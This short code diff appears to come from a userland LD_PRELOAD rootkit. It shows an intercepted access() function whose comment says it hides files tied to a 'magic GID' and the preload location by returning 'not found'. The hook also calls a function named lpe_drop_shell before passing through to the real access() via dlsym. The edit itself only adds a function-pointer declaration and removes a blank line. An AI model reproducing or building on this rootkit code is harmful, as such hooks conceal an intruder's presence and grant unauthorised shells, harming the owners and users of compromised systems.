@@ -3,6 +3,7 @@
 /*
  * access() hook to check magic GID, STRING, and PRELOAD location. Return NOENT if found
 */
+int (*o_access)(const char *, int mode);
 int access(const char * pathname, int mode) {
 
 	#ifdef DEBUG
@@ -10,7 +11,6 @@ int access(const char * pathname, int mode) {
 	#endif
 
 	lpe_drop_shell();
-
 
 	if(!o_access) o_access = dlsym(RTLD_NEXT, "access");
 
